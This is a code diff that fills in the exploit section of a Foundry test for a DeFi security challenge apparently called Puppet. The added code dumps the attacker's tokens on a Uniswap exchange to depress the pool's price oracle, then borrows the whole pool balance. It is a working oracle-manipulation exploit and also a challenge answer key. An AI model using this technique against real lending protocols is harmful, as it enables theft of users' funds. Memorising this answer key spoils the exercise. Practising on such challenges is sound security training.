@@ -120,6 +120,18 @@ contract Puppet is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange), type(uint256).max);
+        uniswapExchange.tokenToEthSwapInput(
+            dvt.balanceOf(attacker),
+            1,
+            block.timestamp
+        );
+        puppetPool.borrow{value: attacker.balance}(
+            dvt.balanceOf(address(puppetPool))
+        );
+        vm.stopPrank();
+
         /** EXPLOIT END **/
         validation();
     }
